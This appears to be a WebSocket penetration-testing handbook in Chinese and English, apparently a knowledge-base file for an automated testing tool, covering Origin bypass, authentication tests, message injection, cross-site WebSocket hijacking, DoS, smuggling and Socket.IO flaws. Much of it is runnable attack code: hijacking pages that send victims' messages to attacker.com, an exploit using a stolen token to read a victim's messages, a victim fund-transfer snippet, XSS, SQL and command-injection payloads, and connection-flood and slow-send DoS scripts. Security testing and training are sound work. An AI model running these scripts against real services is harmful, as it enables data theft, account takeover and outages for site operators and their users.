> 结构：上半原有是主线（握手 / Origin / CSWSH / 注入）；下半补充加深（走私、Socket.IO）。短表没点名时先握手+越权消息。
>
> 与 `src-value-hunting` 冲突时以 rules 为准。仅 Origin 缺失、没有读到/改到他人数据 → 默认不写。

## 一、原有knowledge-base

# WebSocket 安全测试手册

## 一、WebSocket 基础

### 1.1 WebSocket 握手

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### 1.2 识别 WebSocket

```bash
# 从 JS 文件中查找
grep -r "new WebSocket" *.js
grep -r "ws://" *.js
grep -r "wss://" *.js

# 从网络请求中查找（使用 js-reverse MCP）
list_network_requests()
# 查找 Upgrade: websocket 的请求
```

---

## 二、Origin 验证绕过

### 2.1 原理

```
WebSocket 连接应验证 Origin 头，防止跨站攻击

正常: Origin: https://target.com → 允许
攻击: Origin: https://attacker.com → 应拒绝

如果服务端不验证或验证不严格 → 跨站 WebSocket 劫持
```

### 2.2 测试方法

```python
import websocket

def test_origin_bypass(ws_url):
    """测试 Origin 验证"""
    
    origins_to_test = [
        "https://attacker.com",
        "https://target.com.attacker.com",
        "https://attacker.com.target.com",
        "null",
        "",
        "https://target.com:@attacker.com",
    ]
    
    for origin in origins_to_test:
        try:
            ws = websocket.create_connection(
                ws_url,
                header=[f"Origin: {origin}"]
            )
            
            print(f"[+] Origin 绕过成功: {origin}")
            
            # 尝试接收消息
            result = ws.recv()
            print(f"    接收到: {result[:100]}")
            
            ws.close()
            
        except Exception as e:
            print(f"[-] Origin 被拒绝: {origin}")
            print(f"    错误: {str(e)[:50]}")
```

### 2.3 Bash 测试

```bash
# websocat 测试
websocat -H "Origin: https://attacker.com" wss://target.com/chat

# wscat 测试
wscat -c wss://target.com/chat --origin https://attacker.com
```

---

## 三、认证测试

### 3.1 认证方式

```
1. URL 参数: wss://target.com/chat?token=xxx
2. Cookie: 握手时自动发送
3. 自定义头: Sec-WebSocket-Protocol: token.xxx
4. 首条消息: {"type": "auth", "token": "xxx"}
```

### 3.2 测试认证缺失

```python
def test_ws_auth(ws_url):
    """测试 WebSocket 认证"""
    
    # 不带任何认证信息连接
    try:
        ws = websocket.create_connection(ws_url)
        
        print("[!] 无需认证即可连接")
        
        # 尝试发送消息
        ws.send('{"type": "message", "content": "test"}')
        
        # 接收响应
        result = ws.recv()
        print(f"响应: {result}")
        
        ws.close()
        
    except Exception as e:
        print(f"连接失败: {e}")
```

### 3.3 Token 重放测试

```python
def test_token_replay(ws_url, old_token):
    """测试 Token 是否可重放"""
    
    # 使用已过期/已注销的 token
    ws_url_with_token = f"{ws_url}?token={old_token}"
    
    try:
        ws = websocket.create_connection(ws_url_with_token)
        print("[!] Token 可重放")
        ws.close()
    except:
        print("[-] Token 不可重放")
```

---

## 四、消息注入

### 4.1 JSON 注入

```python
def test_message_injection(ws_url, token):
    """测试消息注入"""
    
    ws = websocket.create_connection(f"{ws_url}?token={token}")
    
    # 正常消息
    normal_msg = '{"type": "message", "content": "Hello"}'
    ws.send(normal_msg)
    
    # 注入测试
    injection_payloads = [
        # XSS
        '{"type": "message", "content": "<script>alert(1)</script>"}',
        
        # SQL 注入
        '{"type": "search", "query": "test\' OR \'1\'=\'1"}',
        
        # 命令注入
        '{"type": "ping", "host": "127.0.0.1; whoami"}',
        
        # 类型混淆
        '{"type": "message", "userId": {"$ne": null}}',
        
        # 越权
        '{"type": "message", "targetUserId": "VICTIM_ID"}',
    ]
    
    for payload in injection_payloads:
        ws.send(payload)
        try:
            response = ws.recv()
            print(f"Payload: {payload[:50]}")
            print(f"Response: {response[:100]}")
        except:
            pass
    
    ws.close()
```

### 4.2 二进制消息注入

```python
def test_binary_injection(ws_url):
    """测试二进制消息"""
    
    ws = websocket.create_connection(ws_url)
    
    # 发送二进制数据
    binary_payloads = [
        b"\x00\x00\x00\x01",  # 畸形数据
        b"\xff" * 1000,       # 大量数据
        b"A" * 10000,         # 超长数据
    ]
    
    for payload in binary_payloads:
        ws.send_binary(payload)
        try:
            response = ws.recv()
            print(f"Binary payload sent, response: {response[:50]}")
        except:
            pass
    
    ws.close()
```

---

## 五、跨站 WebSocket 劫持（CSWSH）

### 5.1 原理

```
类似 CSRF，但针对 WebSocket

1. 受害者访问攻击者网站
2. 攻击者网站的 JS 连接到目标 WebSocket
3. 浏览器自动发送受害者的 Cookie
4. 攻击者通过 WebSocket 执行操作或窃取数据
```

### 5.2 PoC 页面

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSWSH PoC</title>
</head>
<body>
    <h1>跨站 WebSocket 劫持 PoC</h1>
    <div id="output"></div>
    
    <script>
        // 连接到目标 WebSocket
        const ws = new WebSocket('wss://target.com/chat');
        
        ws.onopen = function() {
            log('WebSocket 连接成功');
            
            // 发送消息
            ws.send(JSON.stringify({
                type: 'getMessages',
                limit: 100
            }));
        };
        
        ws.onmessage = function(event) {
            log('收到消息: ' + event.data);
            
            // 将数据发送到攻击者服务器
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: event.data
            });
        };
        
        ws.onerror = function(error) {
            log('错误: ' + error);
        };
        
        function log(msg) {
            document.getElementById('output').innerHTML += msg + '<br>';
        }
    </script>
</body>
</html>
```

### 5.3 防护检测

```python
def test_cswsh_protection(ws_url):
    """检测 CSWSH 防护"""
    
    # 1. 检查是否验证 Origin
    # 2. 检查是否使用 CSRF Token
    # 3. 检查是否验证 Sec-WebSocket-Key
    
    # 从恶意 Origin 连接
    try:
        ws = websocket.create_connection(
            ws_url,
            header=["Origin: https://attacker.com"]
        )
        print("[!] 无 CSWSH 防护（Origin 未验证）")
        ws.close()
    except:
        print("[+] 有 CSWSH 防护（Origin 验证）")
```

---

## 六、信息泄露

### 6.1 敏感数据泄露

```python
def monitor_ws_messages(ws_url, token):
    """监控 WebSocket 消息，查找敏感信息"""
    
    ws = websocket.create_connection(f"{ws_url}?token={token}")
    
    sensitive_patterns = [
        r'\b\d{15,19}\b',  # 信用卡号
        r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
        r'\b\d{11}\b',  # 手机号
        r'password',
        r'token',
        r'secret',
    ]
    
    import re
    
    for _ in range(100):
        try:
            msg = ws.recv()
            
            for pattern in sensitive_patterns:
                if re.search(pattern, msg, re.IGNORECASE):
                    print(f"[!] 发现敏感信息: {pattern}")
                    print(f"    消息: {msg[:200]}")
        except:
            break
    
    ws.close()
```

### 6.2 使用 js-reverse MCP 分析

```python
# 使用 js-reverse MCP 的 get_websocket_messages
# 获取所有 WebSocket 消息

# 1. 打开目标页面
# 2. 触发 WebSocket 连接
# 3. 调用 get_websocket_messages()
# 4. 分析消息内容
```

---

## 七、DoS 攻击

### 7.1 大量连接

```python
import threading

def dos_connections(ws_url, count=1000):
    """DoS: 大量连接"""
    
    def connect():
        try:
            ws = websocket.create_connection(ws_url)
            # 保持连接
            while True:
                ws.recv()
        except:
            pass
    
    threads = []
    for _ in range(count):
        t = threading.Thread(target=connect)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
```

### 7.2 大消息攻击

```python
def dos_large_message(ws_url):
    """DoS: 发送超大消息"""
    
    ws = websocket.create_connection(ws_url)
    
    # 发送 10MB 消息
    large_msg = "A" * (10 * 1024 * 1024)
    ws.send(large_msg)
    
    ws.close()
```

### 7.3 慢速攻击

```python
def dos_slow_send(ws_url):
    """DoS: 慢速发送"""
    
    import socket
    import ssl
    import time
    
    # 建立 TCP 连接
    sock = socket.create_connection(('target.com', 443))
    sock = ssl.wrap_socket(sock)
    
    # 发送 WebSocket 握手（慢速）
    handshake = (
        "GET /chat HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    
    # 每秒发送 1 字节
    for byte in handshake.encode():
        sock.send(bytes([byte]))
        time.sleep(1)
    
    sock.close()
```

---

## 八、测试工具

### 8.1 websocat

```bash
# 安装
# Linux: wget https://github.com/vi/websocat/releases/download/v1.11.0/websocat_linux64
# macOS: brew install websocat

# 连接 WebSocket
websocat wss://target.com/chat

# 带自定义头
websocat -H "Origin: https://attacker.com" wss://target.com/chat

# 发送文件内容
cat payload.json | websocat wss://target.com/chat

# 保存接收的消息
websocat wss://target.com/chat > messages.txt
```

### 8.2 wscat

```bash
# 安装
npm install -g wscat

# 连接
wscat -c wss://target.com/chat

# 带 Origin
wscat -c wss://target.com/chat --origin https://attacker.com

# 带自定义头
wscat -c wss://target.com/chat -H "Authorization: Bearer TOKEN"
```

### 8.3 Python websockets 库

```python
import asyncio
import websockets

async def test_websocket():
    uri = "wss://target.com/chat"
    
    async with websockets.connect(uri) as websocket:
        # 发送消息
        await websocket.send('{"type": "message", "content": "test"}')
        
        # 接收消息
        response = await websocket.recv()
        print(f"收到: {response}")

asyncio.run(test_websocket())
```

---

## 九、实战测试流程

### 9.1 信息收集

```
1. 找到 WebSocket 端点（从 JS 文件或网络请求）
2. 分析握手过程（认证方式、Origin 检查）
3. 分析消息格式（JSON/二进制/文本）
4. 识别消息类型（auth/message/command/subscribe）
```

### 9.2 安全测试

```
1. Origin 验证测试
2. 认证测试（无认证/弱认证/Token 重放）
3. 消息注入测试（XSS/SQL/命令注入）
4. 越权测试（访问他人消息/房间）
5. CSWSH 测试
6. 信息泄露测试
7. DoS 测试（谨慎）
```

### 9.3 PoC 编写

```python
# 完整 PoC 示例
import websocket
import json

def exploit_websocket():
    """WebSocket 漏洞利用 PoC"""
    
    # 1. 连接（绕过 Origin 检查）
    ws = websocket.create_connection(
        "wss://target.com/chat",
        header=["Origin: https://attacker.com"]
    )
    
    print("[+] WebSocket 连接成功（Origin 验证绕过）")
    
    # 2. 认证（如果需要）
    auth_msg = json.dumps({
        "type": "auth",
        "token": "STOLEN_TOKEN"
    })
    ws.send(auth_msg)
    
    # 3. 越权访问他人消息
    get_messages = json.dumps({
        "type": "getMessages",
        "userId": "VICTIM_ID"
    })
    ws.send(get_messages)
    
    # 4. 接收响应
    response = ws.recv()
    print(f"[+] 获取到受害者消息: {response}")
    
    # 5. 关闭连接
    ws.close()

exploit_websocket()
```

---

## 十、防护检测

```python
# 检测是否有安全防护

# 1. Origin 验证
# 特征: 非白名单 Origin 被拒绝

# 2. 认证要求
# 特征: 无 Token 无法连接或接收消息

# 3. 速率限制
# 特征: 短时间大量消息被限制

# 4. 消息验证
# 特征: 恶意消息被过滤或拒绝

# 5. CSRF Token
# 特征: 握手时需要 CSRF Token
```

---

## 十二、参考资源

```
# WebSocket 安全
https://portswigger.net/web-security/websockets

# CSWSH
https://christian-schneider.net/CrossSiteWebSocketHijacking.html

# WebSocket 工具
https://github.com/vi/websocat
https://github.com/websockets/wscat
```

---

## 二、补充：websocket

### websocket

### WebSocket Security

## 0. QUICK START

During proxy or raw traffic review, watch for:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

Server success response indicators:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Routing note**: in Burp/browser DevTools, filter for `101` and `Upgrade: websocket`; for deeper API testing, align authn/authz models through `api-security`.

---

## 1. PROTOCOL BASICS

### Client request (typical)

- **`Upgrade: websocket`** and **`Connection: Upgrade`** — required upgrade handshake.
- **`Sec-WebSocket-Key`** — base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.
- **`Sec-WebSocket-Version: 13`** — current standard version for browser interoperability.

### Server response

- **`HTTP/1.1 101 Switching Protocols`** — handshake complete; subsequent frames are WebSocket binary/text frames per RFC.

Minimal conceptual flow:

```text
Client: HTTP GET + Upgrade headers
Server: 101 + Sec-WebSocket-Accept
Channel: framed messages (text/binary), ping/pong, close
```

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

### Condition

- The server **does not validate `Origin`** (or equivalent binding) on the WebSocket handshake, **and**
- The victim has an **active session** (cookie-based or browser-stored creds) to the target site.

Then a malicious page loaded in the victim’s browser may open a WebSocket **as the victim**, similar in spirit to CSRF but for a **persistent bidirectional channel**.

### Proof-of-concept pattern (laboratory / authorized target only)

```javascript
const ws = new WebSocket('wss://vulnerable.example.com/messages');
ws.onopen = () => { ws.send('HELLO'); };
ws.onmessage = (event) => {
  fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));
};
```

**Testing notes**: Confirm whether **`Origin`** is checked, whether **cookies** are sent (`SameSite` rules), and whether **subprotocol** or **custom headers** are required—missing checks increase CSWSH risk.

---

## 3. TESTING WITH TOOLS

### wsrepl

```bash
pip install wsrepl
wsrepl -u wss://target.example.com/ws -P auth_plugin.py
```

Use a **plugin** to reproduce browser cookies, headers, or token refresh during the WebSocket lifecycle.

### ws-harness (bridge to HTTP for other tools)

```bash
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
```

Example downstream use with SQL injection tooling over the bridged HTTP surface (adjust URL to local listener):

```bash
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

### Burp Suite ecosystem

- **SocketSleuth** — inspect and manipulate WebSocket traffic inside Burp.
- **WebSocket Turbo Intruder** — high-rate or scripted message fuzzing.

---

## 4. COMMON VULNERABILITIES

| Issue | Why it matters |
|-------|----------------|
| Missing **`Origin`** validation | Enables **CSWSH** from attacker-controlled pages |
| **Auth token in URL** (`wss://host/ws?token=...`) | Logs, proxies, Referer leakage, browser history |
| **No rate limiting** on messages | Abuse, brute force, DoS |
| **`ws://` instead of `wss://`** | Cleartext on the wire (MITM) |
| **Injection in message bodies** | SQLi, command injection, or XSS if content is stored/reflected elsewhere |

Example sensitive URL anti-pattern:

```text
wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Prefer **Sec-WebSocket-Protocol**, **first-message auth**, or **cookie + CSRF token** patterns aligned with product constraints.

---

## 5. DECISION TREE

1. **Identify endpoint** — From JS bundles, Swagger, or `101` responses; note `wss` vs `ws`.
2. **Handshake review** — Are **`Origin`**, **Host**, and **Cookie** policies correct? Any token in query string?
3. **Session binding** — Reconnect with **another user’s** cookie jar in Burp; compare subscription topics and data leakage.
4. **CSWSH** — Load a **local HTML** page that connects to the target with victim session active; verify server rejects wrong **Origin** or uses non-cookie secret.
5. **Message semantics** — Fuzz JSON/text payloads for injection; mirror same logic as HTTP API testing.
6. **Transport** — Flag **`ws://`** in production; verify TLS and HSTS alignment.

---


## 7. CSWSH — STEP-BY-STEP EXPLOITATION

### Step 1: Confirm no Origin check on WS handshake

```text
### In Burp: intercept the WebSocket upgrade request
### Change Origin header to: https://attacker.com
### If 101 Switching Protocols returned → no Origin validation
### If 403/rejected → Origin is checked (test subdomain variants)
```

### Step 2: Craft attacker page

```html
<html>
<body>
<script>
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    // Connection established as victim (cookies sent automatically)
    console.log('Connected as victim');
    // Send commands as victim
    ws.send(JSON.stringify({action: 'get_profile'}));
    ws.send(JSON.stringify({action: 'list_messages'}));
};

ws.onmessage = function(event) {
    // Exfiltrate all received messages
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(err) {
    fetch('https://attacker.com/error?e=' + encodeURIComponent(err));
};
</script>
</body>
</html>
```

### Step 3: Cookies and session hijacking

```text
Browser behavior for WebSocket:
- Cookies for the target domain ARE sent automatically in the upgrade request
- SameSite=None cookies always sent
- SameSite=Lax cookies: NOT sent (WebSocket is not top-level navigation)
- SameSite=Strict cookies: NOT sent

Key question: is the session cookie SameSite=None or legacy (no SameSite attribute)?
→ Legacy cookies default to Lax in modern Chrome but None in older browsers
```

### Step 4: Read/write messages as victim

```javascript
// Attacker can both READ and WRITE on the WebSocket
// Read: financial data, private messages, admin commands
// Write: transfer funds, change settings, send messages as victim

ws.onopen = () => {
    // Write: perform actions as victim
    ws.send(JSON.stringify({
        action: 'transfer',
        to: 'attacker_account',
        amount: 10000
    }));
};

ws.onmessage = (e) => {
    const data = JSON.parse(e.data);
    if (data.type === 'balance') {
        // Read: exfiltrate sensitive data
        navigator.sendBeacon('https://attacker.com/data',
            JSON.stringify(data));
    }
};
```

---

## 8. WEBSOCKET SMUGGLING

### Concept

Use the WebSocket upgrade to bypass reverse proxy restrictions, then tunnel arbitrary HTTP traffic through the WebSocket connection.

### Upgrade-based proxy bypass

```text
1. Reverse proxy restricts access to /admin (returns 403)
2. Client sends legitimate WebSocket upgrade to /ws
3. Proxy allows the upgrade (101 response)
4. After upgrade, proxy stops inspecting the connection (raw TCP passthrough)
5. Client sends raw HTTP request through the "WebSocket" connection:
   GET /admin HTTP/1.1
   Host: backend-server
6. Backend processes the HTTP request → 200 OK with admin content
```

### H2-over-WebSocket smuggling

```text
1. Connect to target via WebSocket
2. After upgrade, send HTTP/2 preface through the WebSocket tunnel
3. Backend HTTP/2 handler processes the smuggled requests
4. Bypass WAF/proxy rules that only inspect HTTP/1.1 traffic
```

### Implementation with Python

```python
import websocket
import ssl

ws = websocket.create_connection(
    'wss://target.com/ws',
    header=['Origin: https://target.com'],
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

### After upgrade, send raw HTTP through the tunnel
smuggled_request = (
    b"GET /admin/users HTTP/1.1\r\n"
    b"Host: internal-backend\r\n"
    b"Connection: close\r\n\r\n"
)
ws.send(smuggled_request, opcode=0x2)  # binary frame
response = ws.recv()
print(response)
```

### Proxy-specific behaviors

| Proxy | WebSocket Tunnel Behavior |
|-------|--------------------------|
| Nginx | Passes raw TCP after 101 — smuggling possible if backend doesn't validate WS frames |
| HAProxy | Depends on `option http-server-close` vs `tunnel` mode |
| AWS ALB | Terminates WebSocket — reframes traffic, harder to smuggle |
| Cloudflare | Inspects WebSocket frames — raw HTTP smuggling blocked |
| Varnish | Does not support WebSocket natively — upgrade may bypass cache entirely |

---

## 9. SOCKET.IO SPECIFIC VULNERABILITIES

### Namespace injection

Socket.IO supports namespaces (`/admin`, `/chat`). If authorization is only on the default namespace:

```javascript
// Client connects to privileged namespace without auth check
const adminSocket = io('https://target.com/admin');
adminSocket.on('connect', () => {
    adminSocket.emit('list_users');
});

// Server may not verify that the client is authorized for /admin namespace
```

### Event name injection

If event names are derived from user input:

```javascript
// Server-side vulnerable pattern:
socket.on(userInput, handler);

// Attacker sends event name that matches internal event:
socket.emit('__disconnect');     // force disconnect other clients
socket.emit('connection');        // re-trigger connection handler
socket.emit('error');             // trigger error handler
```

### Acknowledgement callback abuse

Socket.IO acknowledgements can return data. If the server sends sensitive data in ack callbacks:

```javascript
socket.emit('get_data', {id: 'admin'}, (response) => {
    // response may contain data the client shouldn't have access to
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

### Polling fallback CSRF

Socket.IO falls back to HTTP long-polling when WebSocket is unavailable. The polling transport uses regular HTTP requests with cookies → susceptible to CSRF if no additional token verification:

```text
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
Content-Type: application/octet-stream

4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

---

## 10. WEBSOCKET MESSAGE INJECTION

### In intercepted connections (MITM on `ws://`)

If the application uses `ws://` (unencrypted), an attacker on the same network can inject messages:

```text
1. ARP spoofing or network position to intercept traffic
2. Identify WebSocket frames in TCP stream
3. Inject crafted frames between legitimate messages
4. Both client→server and server→client injection possible
```

### Application-level injection

When WebSocket messages are concatenated or interpolated without sanitization:

```javascript
// Vulnerable server-side handler:
socket.on('chat', (msg) => {
    // If msg contains JSON metacharacters:
    broadcast(`{"user":"${username}","msg":"${msg}"}`);
    // Injection: msg = '","admin":true,"msg":"hacked'
    // Result: {"user":"attacker","msg":"","admin":true,"msg":"hacked"}
});
```

### Stored XSS via WebSocket

```text
1. Send WebSocket message: <img src=x onerror=alert(document.cookie)>
2. Server stores message and broadcasts to all connected clients
3. If client renders message as HTML → stored XSS
4. All connected users affected simultaneously
```

---

## 11. BINARY WEBSOCKET MESSAGE MANIPULATION

### Protobuf deserialization

Applications using Protocol Buffers over WebSocket may be vulnerable to:

```text
1. Capture binary WebSocket frame
2. Decode protobuf structure (use protoc --decode_raw or protobuf-inspector)
3. Modify field values (e.g., change user_id, amount, role)
4. Re-encode and send modified frame
5. Server deserializes without re-validating field constraints
```

```bash
### Decode captured binary frame
echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw

### Output: field structure with types and values
### Modify, re-encode, send back through WebSocket
```

### MessagePack deserialization

```python
import msgpack
import websocket

ws = websocket.create_connection('wss://target.com/ws')

### Decode received binary message
raw = ws.recv()
data = msgpack.unpackb(raw, raw=False)
### data = {'action': 'get_balance', 'user_id': 123}

### Modify and re-send
data['user_id'] = 1  # IDOR: access admin's balance
ws.send(msgpack.packb(data), opcode=0x2)
```

### Type confusion attacks

Binary serialization formats may allow type confusion:

```text
### Original: user_id as integer (field type 0)
### Modified: user_id as string "1 OR 1=1" (field type 2)
### If server doesn't validate types after deserialization → SQL injection

### Original: is_admin as boolean false (0x00)
### Modified: is_admin as boolean true (0x01)
### Direct privilege escalation if server trusts deserialized values
```

### Tools for binary WebSocket analysis

| Tool | Purpose |
|------|---------|
| Burp Suite + SocketSleuth | Intercept and modify binary frames |
| `protobuf-inspector` | Decode unknown protobuf structures |
| `msgpack-tools` | Encode/decode MessagePack CLI |
| `wsdump` (websocket-client) | Raw frame capture and replay |
| Wireshark | Dissect WebSocket frames at protocol level |
